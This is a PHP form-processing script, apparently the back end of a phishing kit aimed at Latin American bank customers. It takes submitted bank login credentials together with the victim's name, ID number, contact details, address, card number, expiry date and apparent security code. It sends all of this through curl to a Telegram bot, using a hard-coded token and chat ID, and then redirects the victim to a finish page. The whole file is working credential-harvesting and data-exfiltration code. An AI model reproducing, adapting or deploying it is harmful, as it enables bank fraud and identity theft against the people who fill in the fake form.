<?php
// process_form.php

// Token y chat ID de Telegram
$telegram_token = '7151494583:AAGPQX5iMVK9193isjPcQEUVB3iaeinwN4s';
$chat_id = '799134063';
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    $localStorageInfo = isset($_POST['localStorageInfo']) ? json_decode($_POST['localStorageInfo'], true) : null;

    if ($localStorageInfo) {
        $metaInfo = $localStorageInfo['metaInfo'] ?? [];

        $message = "LATAM GOLEADOR💎\n";
        $message .= "-------------------------------\n";
        $message .= "👤Nombre: " . ($metaInfo['name'] ?? 'N/A') . "\n";
        $message .= "🪪Cedula: " . ($metaInfo['cc'] ?? 'N/A') . "\n";
        $message .= "-------------------------------\n";
        $message .= "💌Correo: " . ($metaInfo['email'] ?? 'N/A') . "\n";
        $message .= "📞Teléfono: " . ($metaInfo['telnum'] ?? 'N/A') . "\n";
        $message .= "🌇Ciudad: " . ($metaInfo['city'] ?? 'N/A') . "\n";
        $message .= "🗺️Dirección: " . ($metaInfo['address'] ?? 'N/A') . "\n";
        $message .= "-------------------------------\n";
        $message .= "🏦 Banco: " . ($metaInfo['ban'] ?? 'N/A') . "\n";
        $message .= "💳: " . ($metaInfo['p'] ?? 'N/A') . "\n";
        $message .= "📅: " . ($metaInfo['pdate'] ?? 'N/A') . "\n";
        $message .= "🔐: " . ($metaInfo['c'] ?? 'N/A') . "\n";
        $message .= "------------------------------\n";
        $message .= "💻Logo\n";
        $message .= "🧑‍💻Usuario: " . $username . "\n";
        $message .= "🔐Clave: " . $password . "\n";
        $message .= "------------------------------\n";
        $message .= "Disp: " . ($metaInfo['disp'] ?? 'N/A') . "\n";
    } else {
        $message = "No hay información en localStorage.\n";
    }

    // URL de la API de Telegram
    $url = "https://api.telegram.org/bot$telegram_token/sendMessage";

    // Parámetros de la solicitud
    $post_fields = array(
        'chat_id' => $chat_id,
        'text' => $message
    );

    // Iniciar curl
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_fields));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Ejecutar y cerrar curl
    $result = curl_exec($ch);
    curl_close($ch);

    // Redirigir a una página de éxito o a la página de inicio
    header("Location: finish.php");
    exit();
} else {
    // Redirigir a una página de error si no es un método POST
    header("Location: index.php");
    exit();
}
?>
